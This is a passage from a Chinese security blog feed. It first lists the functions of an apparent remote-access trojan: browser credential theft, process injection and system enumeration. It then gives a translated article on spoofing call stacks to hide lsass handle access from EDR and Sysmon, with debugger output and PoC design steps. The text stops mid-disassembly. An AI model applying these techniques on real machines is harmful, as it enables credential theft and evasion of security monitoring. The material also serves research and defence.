解析加密密钥。</li></ul><ol><li><code>GetBrowserInfo::GetBrowserInfo(BroType brot)</code>: 构造函数，根据浏览器类型初始化相关路径和状态。</li><li><code>GetBrowserInfo::~GetBrowserInfo()</code>: 析构函数，负责清理资源。</li><li><code>std::string GetBrowserInfo::GetFullPathFromRelativeToBro(LPCSTR relative)</code>: 生成相对于浏览器目录的完整路径。</li><li><code>DWORD GetBrowserInfo::GetCookies(std::vector&lt;BrowserCookies&gt; *pBroCookies)</code>: 从 cookies 数据库中提取 cookies 信息。</li><li><code>BOOL GetBrowserInfo::GetAllCookies(std::vector&lt;BrowserCookies&gt; *pBroCookies)</code>: 获取所有 cookies 的入口函数。</li><li><code>BOOL GetBrowserInfo::GetAllData(std::vector&lt;BrowserData&gt; *pBroData)</code>: 获取所有用户数据的入口函数。</li><li><code>DWORD GetBrowserInfo::GetData(std::vector&lt;BrowserData&gt; *pBroData)</code>: 从登录数据数据库中提取用户登录信息。</li><li><code>LPCSTR GetBrowserInfo::ParseEncryptedKey(LPSTR* buf)</code>: 解析加密密钥。</li><li><code>bool GetBrowserInfo::GetMasterKey(DATA_BLOB* pDatab)</code>: 获取解密所需的主密钥。</li><li><code>void GetBrowserInfo::Find360SPLoginDB(std::string lpPath)</code>: 查找 360 浏览器的登录数据库。</li></ol><h3 id="获取360浏览器数据"><a href="#获取360浏览器数据" class="headerlink" title="获取360浏览器数据"></a>获取360浏览器数据</h3><p> <code>Get360seInfo</code> 的类，主要用于从 360 浏览器的数据库中提取用户的浏览器数据，包括账户信息和密码。</p><pre class="mermaid">graph TD;    A[Get360seInfo] --> B[构造函数]    A --> C[getData]    C --> D[Open360Database]    D --> E[OpenLogin360Data]    D --> F[FindLoginDB]    E --> G[DecryptAes]    E --> H[Last360Uncode]</pre><ul><li><strong>Get360seInfo</strong>: 主类，负责初始化和管理数据提取过程。</li><li><strong>构造函数</strong>: 初始化类的成员变量并获取必要的注册表信息。</li><li><strong>getData</strong>: 主要数据提取函数，调用数据库打开和数据读取函数。</li><li><strong>Open360Database</strong>: 打开 360 浏览器的数据库并读取账户信息。</li><li><strong>OpenLogin360Data</strong>: 处理登录数据的提取和解密。</li><li><strong>FindLoginDB</strong>: 查找登录数据库文件的路径。</li></ul><ol><li><code>Get360seInfo::Get360seInfo()</code>: 构造函数，初始化成员变量并从注册表中获取必要的信息。</li><li><code>Get360seInfo::~Get360seInfo()</code>: 析构函数，释放资源。</li><li><code>bool Get360seInfo::getData(std::vector&lt;BrowserData&gt;* pBroData)</code>: 提取浏览器数据，调用数据库打开和登录数据提取函数。</li><li><code>bool Get360seInfo::Open360Database(std::vector&lt;BrowserData&gt;* pBroData)</code>: 打开 360 浏览器的数据库并读取账户信息。</li><li><code>std::string Get360seInfo::Last360Uncode(const char* passItem)</code>: 解码密码项，处理特定格式的密码。</li><li><code>void Get360seInfo::FindLoginDB(std::string lpPath)</code>: 查找登录数据库文件的路径。</li><li><code>bool Get360seInfo::OpenLogin360Data(std::vector&lt;BrowserData&gt;* pBroData)</code>: 提取和解密登录数据。</li><li><code>bool Get360seInfo::EnumChromeRandstr(DWORD th32ProcessID, HANDLE h_360se)</code>: 枚举 Chrome 进程中的随机字符串。</li><li><code>bool Get360seInfo::EnumProcessGetRandstr()</code>: 获取 360 浏览器进程中的随机字符串。</li><li><code>ULONG PseudoRand(ULONG* seed)</code>: 伪随机数生成函数。</li><li><code>void GetBotId(char* botId)</code>: 生成一个唯一的 bot ID。</li></ol><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><p>机器管理器（CMachineManager），用于管理和监控系统中的进程、服务、网络状态等功能。</p><pre class="mermaid">graph LR;    A[CMachineManager] --> B[OnReceive]    B --> C[SendProcessList]    B --> D[SendWindowsList]    B --> E[SendNetStateList]    B --> F[SendSoftWareList]    B --> G[SendIEHistoryList]    B --> H[SendFavoritesUrlList]    B --> I[SendServicesList]    B --> J[SendHostsList]    B --> K[DeleteService]    B --> L[MyControlService]    B --> M[GetRoot]    B --> N[InjectProcess]</pre><ul><li><strong>CMachineManager</strong>: 主要类，负责管理机器的各种操作。</li><li><strong>OnReceive</strong>: 处理接收到的命令，根据命令类型调用相应的处理函数。</li><li><strong>SendProcessList</strong>: 发送当前进程列表。</li><li><strong>SendWindowsList</strong>: 发送当前窗口列表。</li><li><strong>SendNetStateList</strong>: 发送网络状态列表。</li><li><strong>SendSoftWareList</strong>: 发送已安装软件列表。</li><li><strong>SendIEHistoryList</strong>: 发送IE浏览历史。</li><li><strong>SendFavoritesUrlList</strong>: 发送收藏夹URL列表。</li><li><strong>SendServicesList</strong>: 发送服务列表。</li><li><strong>SendHostsList</strong>: 发送hosts文件内容。</li><li><strong>DeleteService</strong>: 删除指定服务。</li><li><strong>MyControlService</strong>: 控制服务的启动、停止、暂停和继续。</li><li><strong>GetRoot</strong>: 获取任务调度器的根目录。</li></ul><ol><li><code>CMachineManager::CMachineManager(ISocketBase* pClient)</code>: 构造函数，初始化机器管理器，设置用户权限和服务。</li><li><code>CMachineManager::~CMachineManager()</code>: 析构函数，释放资源，反初始化COM。</li><li><code>void CMachineManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code>: 处理接收到的数据，根据命令类型调用相应的处理函数。</li><li><code>void CMachineManager::SendProcessList()</code>: 发送当前进程列表。</li><li><code>void CMachineManager::SendWindowsList()</code>: 发送当前窗口列表。</li><li><code>void CMachineManager::SendNetStateList()</code>: 发送网络状态列表。</li><li><code>void CMachineManager::SendSoftWareList()</code>: 发送已安装软件列表。</li><li><code>void CMachineManager::SendIEHistoryList()</code>: 发送IE浏览历史。</li><li><code>void CMachineManager::SendFavoritesUrlList()</code>: 发送收藏夹URL列表。</li><li><code>void CMachineManager::SendServicesList(DWORD dwServiceType)</code>: 发送服务列表。</li><li><code>void CMachineManager::SendHostsList()</code>: 发送hosts文件内容。</li><li><code>void CMachineManager::DeleteService(LPBYTE lpBuffer, UINT nSize)</code>: 删除指定服务。</li><li><code>void CMachineManager::MyControlService(LPBYTE lpBuffer, UINT nType)</code>: 控制服务的启动、停止、暂停和继续。</li><li><code>void CMachineManager::GetRoot()</code>: 获取任务调度器的根目录。</li><li><code>BOOL CMachineManager::DebugPrivilege(const TCHAR* PName, BOOL bEnable)</code>: 调整进程的调试权限。</li><li><code>BOOL CMachineManager::GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser)</code>: 获取指定进程的用户名。</li><li><code>LPBYTE CMachineManager::getProcessList()</code>: 获取当前进程列表。</li><li><code>LPBYTE CMachineManager::getWindowsList()</code>: 获取当前窗口列表。</li><li><code>LPBYTE CMachineManager::getNetStateList()</code>: 获取网络状态列表。</li><li><code>LPBYTE CMachineManager::getSoftWareList()</code>: 获取已安装软件列表。</li><li><code>LPBYTE CMachineManager::getIEHistoryList()</code>: 获取IE浏览历史。</li><li><code>LPBYTE CMachineManager::getFavoritesUrlList()</code>: 获取收藏夹URL列表。</li><li><code>LPBYTE CMachineManager::getServicesList()</code>: 获取服务列表。</li><li><code>LPBYTE CMachineManager::getHostsList()</code>: 获取hosts文件内容。</li><li><code>void CMachineManager::injectprocess(DWORD mode, DWORD ExeIsx86, DWORD dwProcessID, byte* data, DWORD datasize, TCHAR* path)</code>: 注入进程，执行指定的操作。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>伪造调用栈来迷惑EDR和杀软</title>
    <link href="/2024/12/02/%E4%BC%AA%E9%80%A0%E8%B0%83%E7%94%A8%E6%A0%88%E6%9D%A5%E8%BF%B7%E6%83%91EDR%E5%92%8C%E6%9D%80%E8%BD%AF/"/>
    <url>/2024/12/02/%E4%BC%AA%E9%80%A0%E8%B0%83%E7%94%A8%E6%A0%88%E6%9D%A5%E8%BF%B7%E6%83%91EDR%E5%92%8C%E6%9D%80%E8%BD%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><p>调用栈是EDR产品一个被低估但通常重要的遥测数据源。它们可以为事件提供重要的上下文，并在确定误报和真正阳性（尤其是在凭证盗窃事件，例如对lsass的句柄访问）方面成为一个极其强大的工具。已经有一些公开的研究关于伪造调用栈（最著名的是<a href="https://github.com/mgeeky/ThreadStackSpoofer">ThreadStackSpoofer</a>和<a href="https://github.com/Cracked5pider/Ekko">Ekko</a>），但这些研究似乎主要集中在从AV&#x2F;EDR检测中隐藏睡眠线程的调用栈（例如，用于Cobalt Strike的睡眠掩码）。</p><p>这与另一种场景形成对比 - 主动欺骗EDR（或ETW AGENT）使其从内核驱动程序记录伪造的调用栈，特别是在执行特定TTP时，例如为了获取凭证而打开lsass进程句柄。本文将展示一个概念验证技术，使NtOpenProcess能够携带任意伪造的调用栈被调用。</p><h3 id="技术详解"><a href="#技术详解" class="headerlink" title="技术详解"></a>技术详解</h3><p>Windows内核为AV&#x2F;EDR驱动程序提供了多种回调机制，使其能够订阅并接收系统事件通知。这些回调包括进程创建&#x2F;删除事件（PsSetCreateProcessNotifyRoutineEx）、线程创建&#x2F;删除事件（PsSetCreateThreadNotifyRoutine）以及对象访问（ObRegisterCallbacks）等。</p><p>这些回调大多在触发事件的线程上下文中执行。具体来说，当内核驱动程序的进程通知例程被调用时，它会在触发回调的进程上下文中运行（例如通过调用CreateProcess），并能解析该用户进程上下文中的用户模式虚拟地址。这些回调是内联执行的，也就是说操作系统会等待目标操作（如创建进程或新线程）完成后才返回。</p><p>以下是通过windbg内核调试获得的一个内核调用栈示例。它展示了在自定义ObRegisterCallback例程上设置的断点（这里是进程句柄操作），该断点由Outflank的dumpert工具触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nasm">1: kd&gt; k<br>00 ffff9387`368011f0 fffff806`2e0a78cc exampleAVDriver!ObjectCallback+0x50<br>01 ffff9387`36801b70 fffff806`2e0a7a3a nt!ObpCallPreOperationCallbacks+0x10c<br>02 ffff9387`36801bf0 fffff806`2e015e13 nt!ObpPreInterceptHandleCreate+0xaa<br>03 ffff9387`36801c60 fffff806`2e086ca9 nt!ObpCreateHandle+0xce3<br>04 ffff9387`36801e70 fffff806`2e09a60f nt!ObOpenObjectByPointer+0x1b9<br>05 ffff9387`368020f0 fffff806`2e0f27b3 nt!PsOpenProcess+0x3af<br>06 ffff9387`36802480 fffff806`2de272b5 nt!NtOpenProcess+0x23<br>07 ffff9387`368024c0 00007ff7`ef821d42 nt!KiSystemServiceCopyEnd+0x25<br>08 0000000f`f4aff1e8 00007ff7`ef8219b2 Outflank_Dumpert+0x1d42<br>09 0000000f`f4aff1f0 00007ff7`ef821fb0 Outflank_Dumpert+0x19b2<br>0a 0000000f`f4aff890 00007ffd`6c317034 Outflank_Dumpert+0x1fb0<br>0b 0000000f`f4aff8d0 00007ffd`6d862651 KERNEL32!BaseThreadInitThunk+0x14<br>0c 0000000f`f4aff900 00000000`00000000 ntdll!RtlUserThreadStart+0x21<br><br></code></pre></td></tr></table></figure><p>从这个回调中，AV&#x2F;EDR驱动程序可以检查对象访问请求并采取直接行动，比如在必要时从请求的句柄中移除权限位。同样，对于进程或线程回调，AV&#x2F;EDR可以检查新进程&#x2F;线程，并根据检测逻辑或启发式规则（如线程是否指向可疑内存等）采取预防措施，包括阻止执行。</p><p>此外，上述示例有力地证明了调用栈收集的重要性，因为它清楚地显示了直接系统调用的使用——在nt!KiSystemServiceCopyEnd之前的调用栈中并未出现ntdll。</p><p>需要注意的是，ObjectCallback并不一定在触发操作的线程上下文中运行，而是在所谓的任意线程上下文中运行（这意味着当前上下文可能不是实际触发回调的进程）。不过，在大多数情况下可以认为它确实在触发线程的上下文中运行。</p><p>从上述示例可以明确看出，AV&#x2F;EDR可以在内核回调中内联执行调用栈遍历。这正是SysMon在处理进程访问事件（事件ID 10）时所做的。</p><p>在下面的截图中，我们可以看到SysMon记录的进程访问事件，显示svchost获取了lsass的句柄：</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--8a131c9e-aced-4776-9530-ca766ff25779/sysmon-generic-lsass-access.png?quality=82&preferwebp=true"></p><p>图1：一个SysMon事件示例，显示进程访问事件，其中lsass是目标映像。</p><p>我们可以看到事件包含一个”CallTrace”字段，它显示了用户模式调用栈，揭示了导致句柄请求的进程内事件链（虽然没有完整的符号解析）。这个特定事件是在安装SysMon后几分钟生成的，之后会定期出现。由于调用栈中不包含任何异常内存区域，这明显是一个误报。</p><p>通过将SysMon驱动程序（SysmonDrv.sys）加载到IDA中，我们可以了解SysMon如何收集调用栈。关键是找到RtlWalkFrameChain函数并追踪其引用。SysMonDrv为进程句柄操作注册了一个回调（ObjectHandleCallback），每次调用时都会通过StackWalkWrapper函数调用RtlWalkFrameChain来收集用户模式调用栈：</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--1510fbeb-5890-4759-a451-aebdece007d2/object-callback-sysmondrv--resizedimagewzewnjgsota3xq.png?quality=82&preferwebp=true"></p><p>图2：由IDA生成的SysMonDrv的反编译对象回调。</p><p>需要注意的是，SysMon在调用RtlWalkFrameChain时使用标志1（’mov r8d, 1’），这表明它只收集用户模式调用栈。</p><p>RtlWalkFrameChain由ntoskrnl导出，其工作原理（高层次概述）如下：</p><ul><li>调用RtlCaptureContext来捕获当前线程的ContextRecord&#x2F;CONTEXT结构</li><li>调用RtlpxVirtualUnwind，根据CONTEXT结构（如Rip&#x2F;Rsp等）中记录的当前执行状态开始展开堆栈</li></ul><p>RtlVirtualUnwind的实现示例可以在这些位置找到：<a href="https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773">unicorn_pe</a>和<a href="https://doxygen.reactos.org/d8/d2f/unwind_8c.html#a03c91b6c437066272ebc2c2fff051a4c">ReactOS</a>。</p><p>此外，ETW也可以配置为收集堆栈跟踪（参见：<a href="https://github.com/microsoft/krabsetw/pull/191">krabsetw</a>）。这对于识别许多AGENT的异常活动非常有用，比如在应用Microsoft TI feed或查找未备份的wininet调用时。值得注意的是，ETW收集调用栈的方式与典型的内联内核回调方法略有不同——它先向目标线程排队一个APC，然后调用RtlWalkFrameChain。这可能是因为某些ETW AGENT在任意线程上下文中执行。</p><p>快速查看RtlVirtualUnwind的实现可以发现它需要解析（相当复杂的）X64展开代码。因此，要理解通过RtlVirtualUnwind遍历调用栈，首先需要了解X64上的代码生成和执行机制。完整的介绍超出了本文范围，但这篇优秀的CodeMachine博客文章包含了所需的所有信息：<a href="https://codemachine.com/articles/x64_deep_dive.html">CodeMachine</a>。</p><p>简要回顾一下，CPU本身并没有函数的概念，这是高级语言的抽象。在x86上，函数是通过框架指针寄存器（Ebp）在CPU层面实现的。Ebp作为参考点，用于访问堆栈上的局部变量和传递的参数。通过跟踪这个Ebp指针链（即函数框架），可以找到下一个堆栈框架，从而遍历x86堆栈。</p><p>在X64上，情况变得更复杂了，因为Rbp不再用作框架指针。需要理解的关键区别是X64可执行文件包含一个名为”.pdata”的新节区。这个节区本质上是一个数据库，包含了可执行文件中每个函数的指令（称为UNWIND_CODE），说明如何在异常发生时”展开”该函数。在X64上，函数一旦完成其序言（即堆栈修改），就不会再修改堆栈指针，直到其尾声恢复这些修改，因此Rsp在整个函数体中保持静态。</p><p>一些典型的UNWIND_CODEs包括：</p><ul><li>ALLOC_SMALL&#x2F;LARGE（为局部参数分配小型&#x2F;大型内存，如sub rsp, 80h）</li><li>PUSH_NONVOL（将非易失性寄存器压入堆栈，如push rdi）</li></ul><p>在windbg中，’.fnent’命令可以解析指定函数的这些信息并显示其展开信息，下面是kernelbase!OpenProcess的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">0:000&gt; .fnent kernelbase!OpenProcess<br>Debugger function entry 000001e2`92241720 for:<br>(00007ff8`7a3bc0f0) KERNELBASE!OpenProcess | (00007ff8`7a3bc170) KERNELBASE!SetWaitableTimer<br>Exact matches:<br>BeginAddress = 00000000`0002c0f0<br>EndAddress = 00000000`0002c160<br>UnwindInfoAddress = 00000000`00266838<br><br>Unwind info at 00007ff8`7a5f6838, 6 bytes<br>version 1, flags 0, prolog 7, codes 1<br>00: offs 7, unwind op 2, op info c UWOP_ALLOC_SMALL.<br><br></code></pre></td></tr></table></figure><p>这显示OpenProcess只有一个展开代码—在堆栈上分配一个小型内存区域。”UWOP_ALLOC_SMALL”的实际大小是通过将op info值乘以8再加8计算得出（0xc × 8 + 8 &#x3D; 0x68）。通过反汇编kernelbase!OpenProcess的前几个字节可以验证这一点（sub rsp, 68h）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; uf kernelbase!OpenProcess<br><span class="hljs-attribute">KERNELBASE</span>!OpenProcess:<br><span class="hljs-attribute">00007ff8</span>`<span class="hljs-number">7</span>a3bc0f0 <span class="hljs-number">4</span>c8bdc mov r11,rsp<br><span class="hljs-attribute">00007ff8</span>`<span class="hljs-number">7</span>a3bc0f3 <span class="hljs-number">4883</span>ec68 sub rsp,<span class="hljs-number">68</span>h<br><br></code></pre></td></tr></table></figure><ul><li>局部变量的空间</li><li>基于堆栈的参数空间</li><li>返回地址（8字节）</li><li>定位空间</li><li>保存非易失性寄存器的堆栈空间</li></ul><p>让我们以OpenProcess的调用为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">0:000&gt; knf<br># Memory Child-SP RetAddr Call Site<br>00 000000df`7d8fef88 00007ffd`b1bdc13e ntdll!NtOpenProcess<br>01 8 000000df`7d8fef90 00007ff7`f10c087d KERNELBASE!OpenProcess+0x4e<br>02 70 000000df`7d8ff000 00007ff7`f10c24b9 VulcanRaven!main+0x5d [C:\\Users\\wb\\source\\repos\\VulcanRaven\\VulcanRaven\\VulcanRaven.cpp @ 641]<br>03 9e0 000000df`7d8ff9e0 00007ff7`f10c239e VulcanRaven!invoke_main+0x39 [d:\\a01\\_work\\43\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 79]<br>04 50 000000df`7d8ffa30 00007ff7`f10c225e VulcanRaven!__scrt_common_main_seh+0x12e [d:\\a01\\_work\\43\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 288]<br>05 70 000000df`7d8ffaa0 00007ff7`f10c254e VulcanRaven!__scrt_common_main+0xe [d:\\a01\\_work\\43\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 331]<br>06 30 000000df`7d8ffad0 00007ffd`b2237034 VulcanRaven!mainCRTStartup+0xe [d:\\a01\\_work\\43\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_main.cpp @ 17]<br>07 30 000000df`7d8ffb00 00007ffd`b3e82651 KERNEL32!BaseThreadInitThunk+0x14<br>08 30 000000df`7d8ffb30 00000000`00000000 ntdll!RtlUserThreadStart+0x21<br><br></code></pre></td></tr></table></figure><p>顶部条目ntdll!NtOpenProcess（#00）是当前堆栈框架。Child-SP值000000df&#96;7d8fef88表示NtOpenProcess完成函数序言后的Rsp值（即完成所有必要的堆栈修改后的堆栈指针值）。”Memory”列中的值8代表NtOpenProcess使用的总堆栈大小。因此，要计算下一个框架的Child-SP，只需将当前框架的总堆栈大小（8）加到当前Child-SP上：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; ? <span class="hljs-number">000000</span>df`<span class="hljs-number">7</span>d8fef88 + <span class="hljs-number">8</span><br><span class="hljs-attribute">Evaluate</span> expression: <span class="hljs-number">959884291984</span> = <span class="hljs-number">000000</span>df`<span class="hljs-number">7</span>d8fef90<br><br></code></pre></td></tr></table></figure><p>需要注意的是，NtOpenProcess没有展开操作代码（因为它不修改堆栈），所以下一个Child-SP只需跳过前一个调用者（KERNELBASE!OpenProcess）推送的返回地址。这就解释了为什么它的总堆栈大小是8字节（即仅包含返回地址）。</p><p>新的Child-SP（000000df&#96;7d8fef90）代表KERNELBASE!OpenProcess完成其函数序言后的Rsp值。当KERNELBASE!OpenProcess调用ntdll!NtOpenProcess时，它会将返回地址推送到堆栈上。这个返回地址会位于Child-SP指向的位置之后，如图3中的Child-SP 01所示。</p><p>这个过程在下一个框架中继续进行。Kernelbase!OpenProcess的Child-SP是000000df&#96;7d8fef90，总堆栈使用量为0x70字节。将这两个值相加，我们就能得到VulcanRaven!main的下一个Child-SP：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&amp;gt; ? <span class="hljs-number">000000</span>df`<span class="hljs-number">7</span>d8fef90 + <span class="hljs-number">70</span><br><span class="hljs-attribute">Evaluate</span> expression: <span class="hljs-number">959884292096</span> = <span class="hljs-number">000000</span>df`<span class="hljs-number">7</span>d8ff000<br></code></pre></td></tr></table></figure><p>这个遍历过程会一直持续，直到调试器完整地走完整个堆栈。因此，堆栈遍历过程可以概括如下：</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--c1d5a3c5-3137-477d-8def-bc9ae7dac4f1/call-stack-walking-example--resizedimagewzgwmcw0ntzd.png?quality=82&preferwebp=true"></p><p>图3：显示X64堆栈遍历过程的图表。</p><p>这篇博客文章的关键点在于，只要知道函数的总堆栈大小，就能够在不需要符号的情况下跟踪子堆栈指针链并遍历调用栈。在伪造调用栈时，我们将反向运用这一过程。</p><p>在讨论了调用栈遥测的用途，并简要介绍了x64上调用栈展开的工作原理后，我们现在来探讨这篇博客文章的核心问题：我们能否伪造一个调用栈，使其在内联收集（例如从内核驱动程序回调例程内）时被记录下来？</p><h3 id="PoC设计"><a href="#PoC设计" class="headerlink" title="PoC设计"></a>PoC设计</h3><p>这篇博客文章中的PoC采取了以下方法：</p><ol><li>确定要伪造的目标调用栈。在此示例中，我们使用SysMon，从中选取了一个事件类型10的条目（涉及打开lsass句柄），如下所示：</li></ol><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">CallTrace:<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>SYSTEM32<span class="hljs-symbol">\\</span>ntdll.dll + 9d204 (ntdll!NtOpenProcess)<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>KERNELBASE.dll + 32ea6 (KERNELBASE!OpenProcess)<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>lsm.dll + e959<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 79633<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 13711<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + dd77b<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 5d2ac<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 5a408<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 3a266<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 39bb8<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 48a0f<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 47e18<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 47401<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 46e6e<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>RPCRT4.dll + 4b542<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>SYSTEM32<span class="hljs-symbol">\\</span>ntdll.dll + 20330<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>SYSTEM32<span class="hljs-symbol">\\</span>ntdll.dll + 52f26<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>KERNEL32.DLL + 17034<br>C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>SYSTEM32<span class="hljs-symbol">\\</span>ntdll.dll + 52651<br><br></code></pre></td></tr></table></figure><ol><li>对于目标调用栈中的每个返回地址，分析其展开代码并计算所需的总堆栈空间，以便定位下一个childSP框架。</li><li>创建一个挂起的线程，并修改CONTEXT结构，使堆栈&#x2F;rsp完全匹配要伪造的目标调用栈的<strong>精确</strong>轮廓（无实际数据）。通过推送伪造的返回地址并减去正确的子SP偏移量（即反向展开堆栈），我们初始化线程状态以”模拟”目标线程的”轮廓”。需要注意的是，在处理某些展开代码（如UWOP_SET_FPREG）时要格外小心，因为这会导致rsp &#x3D;&#x3D; rbp的重置。</li><li>修改CONTEXT结构，将Rip指向目标函数（ntdll!NtOpenProcess），并按x64调用约定设置必要的参数（通过配置Rcx&#x2F;Rdx&#x2F;R8&#x2F;R9）。</li><li>恢复线程执行。由于使用了伪造的调用栈，系统调用返回时必然会产生错误，此时通过向量化异常处理程序进行处理。在异常处理程序中，我们可以通过重设Rip将线程重定向至RtlExitUserThread，从而实现优雅退出。</li></ol><p>针对上述方法的局限性，我们可以采用一个更优的解决方案：使用向量化异常处理和硬件或软件断点，这类似于这个无补丁AMSI绕过技术：<a href="https://www.notion.so/fe3b63d80890fafeca982f76c8a3efdf?pvs=21">patchless AMSI bypass</a>。</p><p>通过这种方法，我们可以在NtOpenProcess系统调用（00007ff8&#96;7ca6d204）返回时精确设置断点：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">ntdll!NtOpenProcess:</span><br><span class="hljs-number">00007</span>ff8`7ca6d1f0 <span class="hljs-number">4</span>c8bd1 mov r10,rcx<br><span class="hljs-number">00007</span>ff8`7ca6d1f3 b826000000 mov eax,<span class="hljs-number">26</span>h<br><span class="hljs-number">00007</span>ff8`7ca6d1f8 f604250803fe7f01 test byte ptr [SharedUserData+<span class="hljs-number">0</span>x308 (<span class="hljs-number">00000000</span>`7ffe0308)],<span class="hljs-number">1</span><br><span class="hljs-number">00007</span>ff8`7ca6d200 <span class="hljs-number">7503</span> jne ntdll!NtOpenProcess+<span class="hljs-number">0</span>x15 (<span class="hljs-number">00007</span>ff8`7ca6d205) Branch<br><span class="hljs-title">ntdll!NtOpenProcess+0x12:</span><br><span class="hljs-number">00007</span>ff8`7ca6d202 <span class="hljs-number">0</span>f05 syscall<br><span class="hljs-number">00007</span>ff8`7ca6d204 c3 